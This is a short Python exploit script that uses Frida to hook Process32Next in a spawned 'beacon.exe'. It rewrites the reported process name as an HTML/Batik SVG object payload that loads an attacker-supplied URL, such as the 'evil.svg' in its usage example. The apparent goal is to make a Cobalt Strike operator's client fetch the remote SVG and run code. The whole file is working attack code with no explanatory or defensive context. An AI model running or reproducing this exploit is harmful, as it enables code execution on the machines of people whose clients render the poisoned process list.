# -*- coding: UTF-8 -*-
import frida
import time
import sys


def processInject(target, url):
    print('[+] Spawning target process')

    pid = frida.spawn(target)
    session = frida.attach(pid)

    frida_script = '''  
    var payload="<html><object classid='org.apache.batik.swing.JSVGCanvas'><param name='URI' value='USER_PAYLOAD'></param></object>"  
    var pProcess32Next = Module.findExportByName("kernel32.dll", "Process32Next")

    Interceptor.attach(pProcess32Next, {
        onEnter: function(args) {
            this.pPROCESSENTRY32 = args[1];
            if(Process.arch == "ia32"){
                this.exeOffset = 36;
            }else{
                this.exeOffset = 44;
            }
            this.szExeFile = this.pPROCESSENTRY32.add(this.exeOffset);
        },
        onLeave: function(retval) {
            if(this.szExeFile.readAnsiString() == "beacon.exe") {
                send("[!] Found beacon, injecting payload");
                this.szExeFile.writeAnsiString(payload);
            }
        }
    })
    '''.replace("USER_PAYLOAD", url)

    script = session.create_script(frida_script)
    script.load()
    frida.resume(pid)
    # make sure payload is triggered on client
    print("[+] Waiting for 100 seconds")
    time.sleep(100)
    frida.kill(pid)
    print('[+] Done! Killed beacon process.')
    exit(0)


if __name__ == '__main__':
    if len(sys.argv) == 3:
        processInject(sys.argv[1], sys.argv[2])  #从1开始读取参数
    else:
        print("[-] Incorrect Usage! Example: python3 {} beacon.exe http://127.0.0.1:8080/evil.svg".format(sys.argv[0]))
        #sys.argv[0]代表python程序名